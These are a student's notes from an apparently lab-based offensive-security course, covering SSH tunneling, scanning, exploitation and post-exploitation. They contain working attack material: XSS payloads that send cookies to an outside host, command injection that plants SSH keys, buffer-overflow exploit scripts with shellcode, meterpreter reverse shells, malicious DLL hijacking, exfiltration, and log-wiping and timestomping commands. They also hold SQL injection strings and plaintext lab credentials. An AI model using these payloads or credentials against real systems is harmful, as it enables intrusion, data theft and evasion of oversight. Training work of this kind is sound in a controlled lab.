# Day 1 
## GTFO BINS
https://gtfobins.github.io/

## COSC FG
https://vta.cybbh.space/horizon/project/

## Security CTFD Server
https://sec.cybbh.io/public/security/latest/index.html

	CTFD Server: http://10.50.20.250:8000	
	User: NIRI-505-M  
	Pass: gVN5chrkxW0bym1 	

## Gray host: 10.50.34.77
	
 	student
	Pass: gVN5chrkxW0bym1

## LinOps:

	ssh -X student@10.50.22.235
	password1

## Winops:

	xfreerdp /u:student /p:password /dynamic-resolution +clipboard /v:10.50.29.77
	



Scrapping Data:




       1. Host Discovery
        ◦ Find hosts that are online
    2. Port Enumeration
        ◦ Find ports for each host that is online
    3. Port Interrogation
        ◦ Find what service is running on each open/available port
	netstat -natup

Scripts are stored in a subdirectory of the Nmap data directory by default:

/usr/share/nmap/scripts



Vulnerability and Exploitation Research:






## Master Sockets:

All traffic sent through /tmp/gray file will be sent to the 10.50.34.77 IP address. 

	ssh -MS /tmp/gray student@10.50.34.77 

Dynamic Tunnel:

	ssh -S /tmp/gray gray -O forward -D 9050

Canceling a Dynamic Tunnel 

	ssh -S /tmp/gray gray -O cancel -D 9050

## HOST DISCOVERY:

One-line ping-sweep

	for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" & ); done


## Post Enumeration:

	proxychains nmap -v -sT -Pn -T4 -sV 192.168.28.111,120

## Enumeration nmap script: 

	proxychains nmap -v -sT -Pn -T4 --script=http-enum.nse 192.168.28.111 -p 80


Local Port Forward using master Socket:

	ssh -S /tmp/gray gray -O forward -L 41201:192.168.28.111:80


	ssh -S /tmp/gray gray -O forward -L 41202:192.168.28.111:2222

Master Socket through another Master Socket:

	ssh -MS /tmp/comrade comrade@127.0.0.1 -p 41202

# Day2 
## Web Exploitation (XSS)


 <script>document.location="http://10.50.20.97/Cookie_Stealer1.php?username=" + document.cookie;</script>
HTTP Response Codes

    10X == Informational

    2XX == Success

    30X == Redirection

    4XX == Client Error

    5XX == Server Error




HTTP Fields

    User-Agent

    Referer

    Cookie

    Date

    Server

    Set-Cookie



WGET 

	wget -r -l2 -P /tmp ftp://ftpserver/
	wget --save-cookies cookies.txt --keep-session-cookies --post-data 'user=1&password=2' https://website
	wget --load-cookies cookies.txt -p https://website/interesting/article.php


# XSS Demos

Alert Script:

	<script>alert('XSS');</script>


Run on ops station:

	 python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

Run on the webserver to send cookies back to my page:
	
 	<script>document.location="http://10.50.22.235:8000/"+document.cookie;</script>


## Command injection 
* Find users home directory and type of shell.

		; whomai
	 	; cat../../../etc/passwd 
  


* Generate and ssh key

 	 	ssh-keygen -t rsa -b 4096
* Inject public key into website
* Make .ssh folder in home directory

		;ls -la /users/home/directory      #check if .ssh exists
		; mkdir /users/home/directory/.ssh   #make .ssh in users home folder if it does not exis

* Make authorized key file in .ssh

		 ; echo "your_public_key_here" > /users/home/directory/.ssh/authorized_keys


* Verify key has been uploaded successfully.

		 ; cat /users/home/directory/.ssh/authorized_keys

* ssh onto the box:

   		ssh user@ip_addr
  Shouldn't prompt for password. If it does, your wrong. 

* Authenticating with a private key that was found:

  		ssh -i user_rsa.priv user@ip

 * Webserver info is stored

		/var/www/html


# Reverse Engineering:

run file command on the file.

Patching: 
	export program, then save as PE file and change name. 





# Exploit development testing

GDB Uses

	git clone https://github.com/longld/peda.git ~/peda
	echo "source ~/peda/peda.py" >> ~/.gdbinit

	disass <FUNCTION>   #   Disassemble portion of the program
	info <...>  #   Supply info for specific stack areas
	x/256c $<REGISTER>  #   Read characters from specific register
	break <address>  #   Establish a break point

	pdisass main 

wiremask.eu


	gdb
	gdb-peda$ run <<<$(echo "./mybuff.py")

## Start file without env variables
Bare bones gdb

	env - gdb ./func

 In the overflow state from the start of stack to end of the stack. 0xff == JMP , 0xe4 == esp


(gdb) info proc map
process 30350
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	0x56555000 0x56556000     0x1000        0x0 /home/student/Downloads/func
	0x56556000 0x56557000     0x1000        0x0 /home/student/Downloads/func
	0x56557000 0x56558000     0x1000     0x1000 /home/student/Downloads/func
	0x56558000 0x5657a000    0x22000        0x0 [heap]
	0xf7de1000 0xf7fb3000   0x1d2000        0x0 /lib32/libc-2.27.so
	0xf7fb3000 0xf7fb4000     0x1000   0x1d2000 /lib32/libc-2.27.so
	0xf7fb4000 0xf7fb6000     0x2000   0x1d2000 /lib32/libc-2.27.so
	0xf7fb6000 0xf7fb7000     0x1000   0x1d4000 /lib32/libc-2.27.so
	0xf7fb7000 0xf7fba000     0x3000        0x0 
	0xf7fcf000 0xf7fd1000     0x2000        0x0 
	0xf7fd1000 0xf7fd4000     0x3000        0x0 [vvar]
	0xf7fd4000 0xf7fd6000     0x2000        0x0 [vdso]
	0xf7fd6000 0xf7ffc000    0x26000        0x0 /lib32/ld-2.27.so
	0xf7ffc000 0xf7ffd000     0x1000    0x25000 /lib32/ld-2.27.so
	0xf7ffd000 0xf7ffe000     0x1000    0x26000 /lib32/ld-2.27.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]

 Command to get get memory for overwrtiting EIP register
	
 	(gdb) find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4

In the script covert output of the above command from big to little endian. 
#!/usr/bin/python2.7
	
	# Fill UP THE BUFFER
	buf = "A" * 62
	
	# EIP REGISTER TO JMP ESP
	buf += "\x59\x3b\xde\xf7"
	
	'''
	JMP ESP addresses
	0xf7de3b59  
	0xf7f588ab
	0xf7f645fb
	0xf7f6460f
	0xf7f64aeb
	'''
	# assisti with encoding NOP SLED
	buf +="\x90" * 10
	'''
	msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
	'''
	# Shell Code / Payload below
	buf += b"\xdb\xd8\xbe\x34\xcb\x24\x47\xd9\x74\x24\xf4\x58"
	buf += b"\x31\xc9\xb1\x0e\x31\x70\x19\x83\xe8\xfc\x03\x70"
	buf += b"\x15\xd6\x3e\x4e\x4c\x4e\x58\xdd\x34\x06\x77\x81"
	buf += b"\x31\x31\xef\x6a\x31\xd5\xf0\x1c\x9a\x47\x98\xb2"
	buf += b"\x6d\x64\x08\xa3\x7d\x6a\xad\x33\xeb\x0c\xce\x5c"
	buf += b"\x85\xb6\x79\xc4\x79\x10\x5c\x2a\x0d\x34\xcf\x4b"
	buf += b"\x9c\xad\x0f\xdb\x0d\xa4\xf1\x2e\x31"
	
	print(buf)

## Create payload using metasploit

msfconsole

		msf6 > use payload/linux/x86/exec
		msf6 payload(linux/x86/exec) > show options
		
		Module options (payload/linux/x86/exec):
		
		   Name  Current Setting  Required  Description
		   ----  ---------------  --------  -----------
		   CMD                    no        The command string to execute
		
		
		View the full module info with the info, or info -d command.
		
		msf6 payload(linux/x86/exec) > set CMD 'whoami && ifconfig'
		CMD => whoami && ifconfig
		msf6 payload(linux/x86/exec) > show options
		
		Module options (payload/linux/x86/exec):
		
		   Name  Current Setting     Required  Description
		   ----  ---------------     --------  -----------
		   CMD   whoami && ifconfig  no        The command string to execute

		msf6 payload(linux/x86/exec) > generate -b '\x00' -f python

  msfvenom one liner:

  		msfvenom -p linux/x86/exec CMD='whoami && ifconfig' -b '\x00' -f python

## Drop the hammer:
	./func <<<$("./mybuff.py")


## Windows Exploitation Development

msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.22.235 lport=4444 -b "\x00" -f python


		msf6 > use multi/handler
		[*] Using configured payload generic/shell_reverse_tcp
		msf6 exploit(multi/handler) > show options
		
		Module options (exploit/multi/handler):
		
		   Name  Current Setting  Required  Description
		   ----  ---------------  --------  -----------
		
		
		Payload options (generic/shell_reverse_tcp):
		
		   Name   Current Setting  Required  Description
		   ----   ---------------  --------  -----------
		   LHOST                   yes       The listen address (an interface may be specified)
		   LPORT  4444             yes       The listen port
		
		
		Exploit target:
		
		   Id  Name
		   --  ----
		   0   Wildcard Target
		
		
		
		View the full module info with the info, or info -d command.
		
		msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
		payload => windows/meterpreter/reverse_tcp
		msf6 exploit(multi/handler) > set LHOST 0.0.0.0
		LHOST => 0.0.0.0
		msf6 exploit(multi/handler) > set LPORT 4444
		LPORT => 4444
		msf6 exploit(multi/handler) > exploit
		
		[*] Started reverse TCP handler on 0.0.0.0:4444

### secureServerBuffo.py script
	#!/usr/bin/python2.7
	
	import socket
	
	'''
	625011AF
	625011BB
	msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.X.X lport=4444 -b "\x00" -f python
	'''
	
	
	buf = "TRUN /.:/" #Exploit
	buf += "A" * 2003 #Buffer Offset
	buf += "\xa0\x12\x50\x62"  #JMP ESP
	buf += "\x90" * 15 #NOP SLED
	buf += #SHELLCODE HERE
	s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) # Creates IPv4 socket
	
	s.connect(("0.0.0.0",412XX))    #IP and port to connect to through tunnel
 	print s.recv(1024)   #print response
	s.send(buf)       #sends the variable buf
	print s.recv(1024)   #print response
	s.close()         #close the connection

ssh student@jumpbox -L 41245:192.168.150.245:9999 -NT
ssh student@10.50.34.77 -L 41245:192.168.28.120:4242 -NT


set multi/handler on msfconsole

use script with msfvenom payload

### mybuff.py script Linux exploit

	#!/usr/bin/python2.7
	
	# Fill UP THE BUFFER
	buf = "A" * 62
	
	# EIP REGISTER TO JMP ESP
	buf += "\x59\x3b\xde\xf7"
	
	'''
	JMP ESP addresses
	0xf7de3b59  
	0xf7f588ab
	0xf7f645fb
	0xf7f6460f
	0xf7f64aeb
	'''
	# assisti with encoding NOP SLED
	buf +="\x90" * 10
	'''
	msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
	'''
	# Shell Code / Payload below
	buf += b"\xdb\xd8\xbe\x34\xcb\x24\x47\xd9\x74\x24\xf4\x58"
	buf += b"\x31\xc9\xb1\x0e\x31\x70\x19\x83\xe8\xfc\x03\x70"
	buf += b"\x15\xd6\x3e\x4e\x4c\x4e\x58\xdd\x34\x06\x77\x81"
	buf += b"\x31\x31\xef\x6a\x31\xd5\xf0\x1c\x9a\x47\x98\xb2"
	buf += b"\x6d\x64\x08\xa3\x7d\x6a\xad\x33\xeb\x0c\xce\x5c"
	buf += b"\x85\xb6\x79\xc4\x79\x10\x5c\x2a\x0d\x34\xcf\x4b"
	buf += b"\x9c\xad\x0f\xdb\x0d\xa4\xf1\x2e\x31"
	
	print(buf)



# Post Exploitation: 


## Windows Targets Port Proxying:

	netsh interface portproxy add v4tov4 listenport=<LocalPort> listenaddress=<LocalIP> connectport=<TargetPort> connectaddress=<TargetIP> protocol=tcp
	netsh interface portproxy show all
	netsh interface portproxy delete v4tov4 listenport=<LocalPort>
	netsh interface portproxy reset


## Using Stolen Private Key:
-i to specify private key.

		chmod 600 /home/user/stolenkey
  		
		ssh -i /home/user/stolenkey jane@10.20.30.40


## Host Enumeration:

User Enumeration:

  		Windows:
		net user

  		Linux
    		cat /etc/passwd
Process Enumeration:

	
		Windows:
		tasklist /v
		
		Linux:
		ps -elf
Service Enumeration:

	Windows:
	tasklist /svc
	
	Linux:
	chkconfig                   # SysV
	systemctl --type=service    # SystemD
 	systemctl --type=service --state=active | grep running

 Network Connection Enumeration:
 
	
	Windows:
	ipconfig /all
	
	Linux:
	ifconfig -a      # SysV (deprecated)
	ip a             # SystemD


Data Exfiltration
Session Transcript

 	ssh <user>@<host> | tee

Obfuscation (Windows)

	type <file> | %{$_ -replace 'a','b' -replace 'b','c' -replace 'c','d'} > translated.out
	certutil -encode <file> encoded.b64

Obfuscation (Linux)

	cat <file> | tr 'a-zA-Z0-9' 'b-zA-Z0-9a' > shifted.txt
	cat <file>> | base64

Encrypted Transport

	scp <source> <destination>
	ncat --ssl <ip> <port> < <file



Inspect Linux Files /etc/hosts && /etc/crontab

### General commands:

Windows:

dir /ah
find "string" <file>    ( /i is case insensitive )
type <file> 	(Equivilant of Cat in liux)
tasklist /svc | findstr "<pid #>"


# Privilege Escalation, Persistence and coveing tracks


DLL Search Order

Executables check the following locations (in successive order):


    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs

    The directory the the Application was run from

    The directory specified in in the C+ function GetSystemDirectory()

    The directory specified in the C+ function GetWindowsDirectory()

    The current directory

DEMO: Checking UAC Settings

	reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System


DEMO: Finding vulnerable Scheduled Tasks

	schtasks /query /fo LIST /v


 
DEMO: Audit Logging
Show all audit category settings

	auditpol /get /category:*

What does the below command show?

	auditpol /get /category:* | findstr /i "success failure"

Important Microsoft Event IDs

	4624/4625 Successful/failed login

	4720 Account created

	4672 Administrative user logged on

	7045 Service created

DEMO: Event Logging

	Storage: c:\windows\system32\config\
	File-Type: .evtx/.evt

	wevtutil el

	wmic ntevent where "logfile="<LOGNAME>" list full

	Get-Eventlog -List

## Important applications:
### Scheduled Tasks

  	task scheduler
   	triggers and actions

### Services

	Check for ones without description.

Registry Run keys


## sysinternals suite
download sysinternals tools onto adversaries box or pull the files and examine them locally with the same suite

procmon

  	process name contains " "
   	path contains .dll 
    	Result contains NAME NOT FOUND or (NAME_NOT_FOUND)
     
## Dll injection
Find vulnerable service and the dll thats runwith it. After scp the payload over, restart the box to get the requested output. 
 
	msfvenom -p windows/exec CMD='cmd.exe /C "dir C:\Users\Admin\Desktop" > C:\MemoryStatus\dir.txt' -f dll > hijackmeplz.dll
 		scp student@10.50.22.235:/home/student/hijackmeplz.dll . (Run on the target Machine)
  
	msfvenom -p windows/exec CMD='cmd.exe /C "type C:\Users\Admin\Desktop\flag.txt" > C:\MemoryStatus\flag.txt' -f dll > hijackmeplz.dll
		scp student@10.50.22.235:/home/student/hijackmeplz.dll . (Run on the target Machine)



# Linux Priv Esc, Persitence, & Obfuscation

### SUID/GUID
passwd command
modifies /etc/shadow file with suid privileges


### World-Writable Files and Folder:

	find / -type f -perm /2 -o -type d -perm /2 2>/dev/null  # Search for any file or directory that is writable by the context "other"

  	find / -type f -perm /4000 -ls 2>/dev/null 	# finds commands with the suid bit set. 

  	find / -type f -writable -o -type d -writable 2>/dev/null # Search for any file or directory that is writable by the current user
 	/tmp 

### Covering Your Tracks
Remote Logging

syslog, rsyslog, logs configuration file. 


### Plan 

   	Prior, after, before (Know the system!)

        What will happen if I do X (What logging?)

        Checks (Where are things?)

        Hide (File locations, names, times)

    	When do you start covering your tracks?

#### Check init system 

	ps -p1
 
#### Auditing SystemV:
ausearch: Pulls from audit.log


	ausearch -p 22
	ausearch -m USER_LOGIN -sv no
	ausearch -ua edwards -ts yesterday -te now -i
 
#### Auditing SystemD:
SystemD

Utilzes journalctl

	journalctl _TRANSPORT=audit
	journalctl _TRANSPORT=audit | grep 603


### Cleaning The Logs

    Before we start cleaning, save the INODE!

        Affect on the inode of using mv VS cp VS cat

    Know what we are removing (Entry times? IP? Whole file? 


Cleaning The Logs (Basic)

Get rid of it

	rm -rf /var/log/...

Clear It

	cat /dev/null > /var/log/...
	echo > /var/log/..




Cleaning The Logs (Precise)

Always work off a backup!


GREP (Remove)

	egrep -v '10:49*| 15:15:15' auth.log > auth.log2; cat auth.log2 > auth.log; rm auth.log2


SED (Replace)

	cat auth.log > auth.log2; sed -i 's/10.16.10.93/136.132.1.1/g' auth.log2; cat auth.log2 > auth.log


#### Timestomp (Nix)

Easy with Nix vs Windows (Native change of Access & Modify times)

	touch -c -t 201603051015 1.txt   # Explicit
	touch -r 3.txt 1.txt    # Reference

#### Remote Logging: rsyslog
Check the config!

    Identify server being shipped to!

    Identify which logs are being shipped

Rsyslog? Need to be thorough!

    New version references multiple files for rules

Rsyslog

    Newer Rsyslog references /etc/rsyslog.d/* for settings/rules

    Older version only uses /etc/rsyslog.conf

    Find out:
    	grep "IncludeConfig" /etc/rsyslog.conf




# DryRun

* 5 boxes ---- ignore anything ending in .190
* priv escalation on two boxes

* First Targe Ip address: 10.50.35.1

1.) http enum script on webserver.
2.) XSS on login.html

## ssh credentials:
system_user=user2
user_password=EaglesIsARE78


user2@PublicFacingWebsite:/$ ip n
10.10.28.30 dev ens3 lladdr fa:16:3e:f9:39:67 REACHABLE

ip a
cat/etc/hosts
192.168.28.181 WebApp


http://127.0.0.1:41270/pick.php?product=7%20or%201=1



10.50.35.1/login.php?username=Aaron' or 1='1 & passwd=Aaron' or 1='1




URL>/uniondemo.php?Selection=2 UNION SELECT 1,table_name,3 FROM information_schema.tables
<URL>/uniondemo.php?Selection=2 UNION SELECT 1,table_schema,table_name FROM information_schema.tables
<URL>/uniondemo.php?Selection=2 UNION SELECT table_name,1,column_name FROM information_schema.columns

http://127.0.0.1:41270/pick.php?product=7%20%20Union%20Select%20username,name,user_id%20from%20users

rot13 on the passwords to get actual password


Aaron 	Aaron 	$1	apasswordyPa$$word 
user2 	user2 	$2	EaglesIsARE78
user3 	user3 	$3	Bob4THEEapples
Lroth 	Lee_Roth 	anotherpassword4THEages


## run ping sweep script
for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" & ); done



Nmap scan report for 192.168.28.179
22/tcp   open  ssh
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
9999/tcp open  abyss


